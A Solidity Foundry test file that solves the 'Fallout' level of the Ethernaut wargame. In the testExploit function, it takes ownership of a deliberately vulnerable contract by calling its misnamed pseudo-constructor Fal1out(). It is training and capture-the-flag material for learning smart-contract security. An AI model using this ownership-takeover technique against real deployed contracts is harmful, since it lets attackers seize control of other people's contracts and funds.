// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {FalloutFactory} from "../src/Fallout/FalloutFactory.sol";
import {Fallout} from "../src/Fallout/Fallout.sol";

contract FalloutTest is Test {
    Ethernaut ethernaut;
    address payable player;

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        FalloutFactory falloutFactory = new FalloutFactory();
        ethernaut.registerLevel(falloutFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
        Fallout falloutInstance = Fallout(payable(levelAddress));

        // Simulate exploit
        falloutInstance.Fal1out();
        assertEq(falloutInstance.owner(), player);
    }
}
